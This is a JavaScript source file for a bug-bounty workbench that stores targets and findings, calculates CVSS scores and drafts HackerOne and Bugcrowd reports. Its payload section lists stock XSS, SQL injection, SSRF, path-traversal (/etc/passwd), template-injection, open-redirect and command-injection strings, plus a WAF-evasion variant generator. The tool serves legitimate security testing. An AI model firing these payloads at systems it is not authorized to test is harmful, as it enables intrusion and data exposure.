const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);

// state
let targets = JSON.parse(localStorage.getItem('targets')||'[]');
let findings = JSON.parse(localStorage.getItem('findings')||'[]');
let notes = localStorage.getItem('notes')||'';

// nav
function switchView(v){
  $$('.view').forEach(x=>x.classList.remove('active'));
  $$('.nav-item').forEach(x=>x.classList.remove('active'));
  $('#view-'+v).classList.add('active');
  document.querySelector(`[data-view="${v}"]`).classList.add('active');
}
$$('.nav-item').forEach(b=>b.addEventListener('click',()=>switchView(b.dataset.view)));
window.switchView = switchView;

// targets
function addTarget(){
  const name=$('#t-name').value.trim(), url=$('#t-url').value.trim(), status=$('#t-status').value;
  if(!name) return;
  targets.push({id:Date.now(),name,url,status});
  save(); renderTargets(); updateStats();
  $('#t-name').value=''; $('#t-url').value='';
}
function deleteTarget(id){ targets=targets.filter(t=>t.id!==id); save(); renderTargets(); updateStats(); }
function renderTargets(){
  $('#targets-list').innerHTML = targets.map(t=>`
    <div class="list-item">
      <div><div class="title">${esc(t.name)}</div><div class="meta">${esc(t.url)} · ${esc(t.status)}</div></div>
      <div class="actions"><button onclick="deleteTarget(${t.id})">del</button></div>
    </div>`).join('') || '<div class="muted">No targets yet.</div>';
}
window.addTarget=addTarget; window.deleteTarget=deleteTarget;

// findings
function addFinding(){
  const title=$('#f-title').value.trim();
  if(!title) return;
  findings.push({id:Date.now(),title,sev:$('#f-sev').value,target:$('#f-target').value,endpoint:$('#f-endpoint').value,cvss:$('#f-cvss').value,desc:$('#f-desc').value});
  save(); renderFindings(); updateStats();
  $('#f-title').value=''; $('#f-target').value=''; $('#f-endpoint').value=''; $('#f-cvss').value=''; $('#f-desc').value='';
}
function deleteFinding(id){ findings=findings.filter(f=>f.id!==id); save(); renderFindings(); updateStats(); }
function renderFindings(){
  const q=$('#f-search').value.toLowerCase(), filt=$('#f-filter').value;
  let list=findings.filter(f=>(!q||f.title.toLowerCase().includes(q)||f.desc.toLowerCase().includes(q)) && (!filt||f.sev===filt));
  $('#findings-list').innerHTML = list.map(f=>`
    <div class="list-item">
      <div>
        <div class="title">${esc(f.title)} <span class="badge ${f.sev}">${f.sev}</span></div>
        <div class="meta">${esc(f.target)} ${f.endpoint?'· '+esc(f.endpoint):''} ${f.cvss?'· CVSS '+esc(f.cvss):''}</div>
        ${f.desc?`<div class="meta" style="margin-top:.4rem;white-space:pre-wrap">${esc(f.desc)}</div>`:''}
      </div>
      <div class="actions"><button onclick="deleteFinding(${f.id})">del</button></div>
    </div>`).join('') || '<div class="muted">No findings.</div>';
  // recent on dashboard
  $('#recent-findings').innerHTML = findings.slice(-5).reverse().map(f=>`
    <div class="list-item"><div><div class="title">${esc(f.title)} <span class="badge ${f.sev}">${f.sev}</span></div><div class="meta">${esc(f.target)}</div></div></div>`).join('') || '<div class="muted">No findings yet.</div>';
}
window.addFinding=addFinding; window.deleteFinding=deleteFinding; window.renderFindings=renderFindings;

// payloads
const PAYLOADS = {
xss:["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg onload=alert(1)>","\"><script>alert(1)</script>","javascript:alert(1)"],
sqli:["' OR '1'='1","' OR 1=1--","' UNION SELECT NULL--","1' AND SLEEP(5)--"],
ssrf:["http://169.254.169.254/latest/meta-data/","http://127.0.0.1:80","http://localhost/admin","file:///etc/passwd","gopher://127.0.0.1:6379/_INFO"],
lfi:["../../../../etc/passwd","....//....//....//etc/passwd","/etc/passwd%00","php://filter/convert.base64-encode/resource=index.php"],
ssti:["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","{{config}}"],
redirect:["//evil.com","https://evil.com","/\\evil.com","https:evil.com"],
cmdi:["; id","| id","&& id","`id`","$(id)"],
};
function enc(s,t){ if(t==='url')return encodeURIComponent(s); if(t==='b64')return btoa(s); if(t==='hex')return [...s].map(c=>c.charCodeAt(0).toString(16)).join(''); if(t==='double')return encodeURIComponent(encodeURIComponent(s)); if(t==='unicode')return [...s].map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join(''); return s; }
function genPayloads(){
  const t=$('#p-type').value, e=$('#p-enc').value;
  $('#payload-out').textContent = PAYLOADS[t].map(p=>enc(p,e)).join('\n');
}
function genWaf(){
  const t=$('#p-type').value;
  let out=[];
  for(const p of PAYLOADS[t]){
    out.push(p);
    out.push(p.split('').map((c,i)=>i%2?c.toUpperCase():c.toLowerCase()).join(''));
    out.push(p.replace(/ /g,'/**/'));
    out.push(encodeURIComponent(encodeURIComponent(p)));
    out.push(p+'%00');
  }
  $('#payload-out').textContent = out.join('\n');
}
window.genPayloads=genPayloads; window.genWaf=genWaf;

// cvss
const CV={AV:{N:.85,A:.62,L:.55,P:.2},AC:{L:.77,H:.44},PR_U:{N:.85,L:.62,H:.27},PR_C:{N:.85,L:.68,H:.5},UI:{N:.85,R:.62},C:{N:0,L:.22,H:.56},I:{N:0,L:.22,H:.56},A:{N:0,L:.22,H:.56}};
function calcCvss(){
  const m={AV:$('#cv-av').value,AC:$('#cv-ac').value,PR:$('#cv-pr').value,UI:$('#cv-ui').value,S:$('#cv-s').value,C:$('#cv-c').value,I:$('#cv-i').value,A:$('#cv-a').value};
  const av=CV.AV[m.AV],ac=CV.AC[m.AC];
  const prtab = m.S==='C'?CV.PR_C:CV.PR_U;
  const pr=prtab[m.PR], ui=CV.UI[m.UI];
  const c=CV.C[m.C], i=CV.I[m.I], a=CV.A[m.A];
  const iss=1-(1-c)*(1-i)*(1-a);
  let impact = m.S==='U' ? 6.42*iss : 7.52*(iss-.029)-3.25*((iss-.02)**15);
  if(impact<0) impact=0;
  const expl=8.22*av*ac*pr*ui;
  let base = impact<=0?0 : (m.S==='U'?Math.min(impact+expl,10):Math.min(1.08*(impact+expl),10));
  base=Math.ceil(Math.round(base,9)*10)/10;
  const sev = base===0?'None':base<4?'Low':base<7?'Medium':base<9?'High':'Critical';
  $('#cvss-result').innerHTML = `<div><strong>Score: ${base}</strong> (${sev})</div><div style="margin-top:.5rem;color:var(--muted)">CVSS:3.1/AV:${m.AV}/AC:${m.AC}/PR:${m.PR}/UI:${m.UI}/S:${m.S}/C:${m.C}/I:${m.I}/A:${m.A}</div>`;
}
window.calcCvss=calcCvss;

// report
function genReport(){
  const title=$('#r-title').value||'Finding', platform=$('#r-platform').value, url=$('#r-url').value, sev=$('#r-sev').value||'High';
  const steps=$('#r-steps').value, impact=$('#r-impact').value, poc=$('#r-poc').value;
  let out=`# ${title}\n\n`;
  if(platform==='hackerone'){
    out+=`**Severity:** ${sev}\n**Target:** ${url}\n\n## Steps to Reproduce\n${steps}\n\n## PoC\n\`\`\`\n${poc}\n\`\`\`\n\n## Impact\n${impact}\n`;
  } else if(platform==='bugcrowd'){
    out+=`## Target\n${url}\n\n## Severity\n${sev}\n\n## Steps to Reproduce\n${steps}\n\n## PoC\n\`\`\`\n${poc}\n\`\`\`\n\n## Impact\n${impact}\n`;
  } else {
    out+=`Severity: ${sev}\nTarget: ${url}\n\nSteps:\n${steps}\n\nPoC:\n${poc}\n\nImpact:\n${impact}\n`;
  }
  $('#report-out').textContent=out;
}
function copyReport(){ navigator.clipboard.writeText($('#report-out').textContent); }
window.genReport=genReport; window.copyReport=copyReport;

// notes
$('#notes').value=notes;
function saveNotes(){ localStorage.setItem('notes',$('#notes').value); $('#notes-status').textContent='saved'; setTimeout(()=>$('#notes-status').textContent='',1500); }
window.saveNotes=saveNotes;

// helpers
function esc(s){ return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function save(){ localStorage.setItem('targets',JSON.stringify(targets)); localStorage.setItem('findings',JSON.stringify(findings)); }
function updateStats(){
  $('#stat-targets').textContent=targets.length;
  $('#stat-findings').textContent=findings.length;
  const c={Critical:0,High:0,Medium:0,Low:0};
  findings.forEach(f=>{ if(c[f.sev]!==undefined) c[f.sev]++; });
  $('#stat-crit').textContent=c.Critical;
  $('#stat-high').textContent=c.High;
  $('#stat-med').textContent=c.Medium;
  $('#stat-low').textContent=c.Low;
}
function clearAll(){ if(!confirm('Wipe all data?'))return; targets=[];findings=[];localStorage.clear(); renderTargets();renderFindings();updateStats(); $('#notes').value=''; }
window.clearAll=clearAll;

// init
renderTargets(); renderFindings(); updateStats();
switchView('dashboard');
